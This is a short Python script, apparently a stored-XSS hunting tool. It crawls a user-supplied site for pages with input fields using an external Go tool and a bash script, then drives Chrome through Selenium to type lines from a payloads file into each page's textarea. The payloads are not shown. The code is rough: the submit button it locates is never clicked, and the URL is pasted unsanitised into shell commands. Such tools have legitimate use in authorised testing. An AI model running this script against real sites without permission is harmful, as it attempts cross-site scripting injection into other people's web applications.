import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import os
import re
from urllib.request import urlopen
from selenium.webdriver import ActionChains


# to get all pages that possibly have textarea and inputs in it 
url = input("Enter Your URL To Find Pages: ")
print("[+] Getting All Available Pages...")
cmd5 = f" cd input-field-finder ;go run main.go  -urls={url} | grep -Eo 'http://[^ >]+' | sed 's/.$//' | uniq -u   > URLforSXSS.txt "
f5 = os.popen(cmd5).read()
print(f5)

with open('URLforSXSS.txt', 'r') as pf:
    cmd3 = f'cat URLforSXSS.txt | cut -d= -f1 | sort -u > FURLforSXSS.txt '
    f2 = os.popen(cmd3).read()
    print(f2)

print("[+] Getting All Valid/Unique Page And Put Them In FFUrlSxss.txt...") # from FURLforSXSS.txt
cmd6 = 'bash xss.sh'
os.system(cmd6)

print("[+] Sending Payloads With Selenium...")
driver = webdriver.Chrome()
driver.implicitly_wait(0.5)

with open('FFUrlSxss.txt', 'r') as fp:
    for line in fp:
        driver.get(f"{line}")
        s = driver.page_source
        if "<textarea" in s:
            text_area = driver.find_element(By.TAG_NAME, 'textarea')
            button_area = driver.find_element(By.XPATH, "//form[button/@type ='submit']")
            with open('payloads.txt', 'r') as pa:
                for Line in pa:
                    pass
                    text_area.send_keys(f"{Line}")
                    text_area.click()


    driver.close()


